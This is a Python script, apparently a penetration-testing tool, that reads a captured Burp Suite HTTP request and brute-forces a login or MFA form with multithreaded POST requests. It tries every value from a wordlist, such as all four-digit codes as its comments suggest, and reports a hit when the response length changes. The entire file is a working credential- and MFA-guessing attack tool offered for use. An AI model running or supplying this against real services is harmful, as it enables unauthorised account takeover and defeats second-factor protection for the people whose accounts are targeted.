#!/usr/bin/python3
import requests
import sys
import threading

#python3 pythonBrute.py burpSuiteRequestText passwordList https > output.txt

#bash to create a list of all 4 digit mfa codes 
#seq -w 0001 9999 > passwordList 

class bcolors:
    WARNING = '\033[93m'   
    ENDC = '\033[0m'

urlPrefix = 'http://'
url = ''
_headers = {}
_cookies = {}
parameters = {}

badLength = 0
chunk = 100;  #how many requests to send before checking for a success        

arguments = len(sys.argv) - 1

if arguments < 2:
	print('Message file, Payloads file required')
	sys.exit()
	
if arguments == 3:
    if sys.argv[3] != '':
    	urlPrefix = sys.argv[3]
    	if '://' not in urlPrefix:
    	    urlPrefix += '://'
    	       
message = sys.argv[1]
loopValues = sys.argv[2]

def setUrl(count, line):
    global url
    if count == 1:   	
        url += line.partition(' ')[2].rsplit(' ', 1)[0]
    elif count == 2:
    	url = line.partition(' ')[2] + url
    	url = url.replace("\r","").replace("\n","")
    	
def setCookies(line):
    global _cookies
    line = line.partition(' ')[2]
    each = line.rsplit(';')
    for e in each:
        #for each cookie strip whitespace, split the value on = and format. Example ; value=test would be 'value':'test',
    	_cookies[e.strip().rsplit('=')[0]] = e.strip().rsplit('=')[1]
 
def setHeaders(line):
    global _headers     
    #[:-1] is to remove last char which is :
    if line != '':
        _headers[line.partition(' ')[0][:-1]] = line.partition(' ')[2] 

def setParameters(line):
    global parameters 
    parameters[line.strip().rsplit('=')[0]] = line.strip().rsplit('=')[1] 


def getBadLength():
    global _headers, _cookies, parameters, badLength

    parameters[list(parameters.keys())[0]] = 'badRequest'  
    x = requests.post(url, data = parameters, headers = _headers, cookies = _cookies, timeout=2) 
    badLength = str(len(x.text))

def getUrl(parameter):
    global _headers, _cookies, parameters

    value = parameter.replace("\r","").replace("\n","")
    parameters[list(parameters.keys())[0]] = value
    
    x = requests.post(url, data = parameters, headers = _headers, cookies = _cookies, timeout=2)
    
    #print(x.text)
    post_len = str(len(x.text))
    
    if badLength != post_len :
        print(bcolors.WARNING + "Found Value is: " + value + ". With response length of " + post_len)
        output.append(1)
    else:
        print(bcolors.ENDC  + value + "|" + post_len, end='\r') 
        output.append(0)      

def chunks(l, n):
    n = max(1, n)
    return (l[i:i+n] for i in range(0, len(l), n))     
        
output = []

def main():
    global chunk, values, output
    
    threads = []   
    getBadLength()
    print('\r')

    for process in list(chunks(values, chunk)): #send requests in chunks to make sure all sessions that are open will close before running another chunk
       for line in list(process): #loop though each line in the password file and send a request for each line 
          t= threading.Thread(target=getUrl, args=(line,))
          t.start()
          threads.append(t)
    
       for thread in threads: #stop threads for the current chunk
          thread.join()

       if 1 in output: #as each request is send it adds a value of 1 or 0 to the output var. If this output array has a 1 then the value is found and the program can exit
          sys.exit()
          
       output = []
       
    print("Exiting Main Thread")
      		
#Read from message file
count = 1
with open(message) as f:
   lines = f.readlines()
   last = lines[-1]

   for line in lines:
       line = line.replace("\r","").replace("\n","")
       if count <= 2:
           setUrl(count, line)
       else:
       	   if line.lower().rsplit(' ')[0].replace(":","") == 'cookie':  
       	       setCookies(line)
       	   elif line.replace("\r","").replace("\n","") == last.replace("\r","").replace("\n",""):
       	       setParameters(line)
       	   else:    	       
       	       setHeaders(line)
       	                
       count += 1
       
url = urlPrefix + url

#print(_cookies)
#print(_headers)
#print(parameters)

print('\r')
print('Target: ' + url)

file = open(loopValues, 'r')
values = file.readlines() 
  
    
if __name__ == "__main__":
    main()
